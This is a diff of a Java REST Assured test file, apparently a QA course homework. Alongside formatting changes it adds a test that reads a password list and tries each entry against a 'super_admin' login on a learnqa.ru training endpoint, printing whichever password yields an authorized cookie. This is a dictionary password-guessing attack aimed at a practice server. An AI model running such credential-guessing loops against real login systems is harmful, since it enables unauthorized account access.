@@ -2,9 +2,9 @@ import io.restassured.RestAssured;
 import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Test;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+
+import java.io.*;
+import java.util.*;
 
 public class HelloWorldTest {
 
@@ -169,7 +169,9 @@ public class HelloWorldTest {
                     .get(URL)
                     .andReturn();
             count_redirects++;
-            if (response.getStatusCode() == 200) {break;}
+            if (response.getStatusCode() == 200) {
+                break;
+            }
         }
         System.out.println("Количество редиректов: " + count_redirects);
     }
@@ -201,7 +203,7 @@ public class HelloWorldTest {
         System.out.println("Response after get with token:");
         responseAfterToken.prettyPrint();
 
-        Thread.sleep((seconds)*1000);
+        Thread.sleep((seconds) * 1000);
 
         Response responseAfterTokenAndExpectation = RestAssured
                 .given()
@@ -212,5 +214,59 @@ public class HelloWorldTest {
 
         System.out.println("Response after get with token and expectation:");
         responseAfterTokenAndExpectation.prettyPrint();
+    }
+
+    @Test
+    public void EX9_passwordGuessing() throws IOException {
+        FileReader fr = new FileReader("passwords.txt");
+        Scanner sc = new Scanner(fr);
+        String stringFromSc = "";
+        while (sc.hasNextLine()) {
+            stringFromSc += (sc.nextLine());
+        }
+        fr.close();
+
+        String[] passwords = stringFromSc.split("\t");
+
+        Set<String> passwordsWithoutDuplicates = new HashSet<>();
+        for (String str : passwords) {
+            passwordsWithoutDuplicates.add(str);
+        }
+
+        for (String str : passwordsWithoutDuplicates) {
+            Map<String, String> body = new HashMap<>();
+            body.put("login", "super_admin");
+            body.put("password", str);
+
+            String URL_login = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
+            Response responseFromGet = RestAssured
+                    .given()
+                    .body(body)
+                    .when()
+                    .post(URL_login)
+                    .andReturn();
+
+            String respCookies = responseFromGet.getCookie("auth_cookie");
+
+            Map<String, String> cookies = new HashMap<>();
+            if (respCookies != null) {
+                cookies.put("auth_cookie", respCookies);
+            }
+
+            String URL_checkCookies = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
+            Response responseCheckCookies = RestAssured
+                    .given()
+                    .cookies(cookies)
+                    .when()
+                    .post(URL_checkCookies)
+                    .andReturn();
+
+            String answer = responseCheckCookies.asString();
+            Boolean result = answer.equals("You are NOT authorized");
+            if (!result){
+                System.out.println("Password is: " + str);
+                break;
+            }
+        }
     }
 }
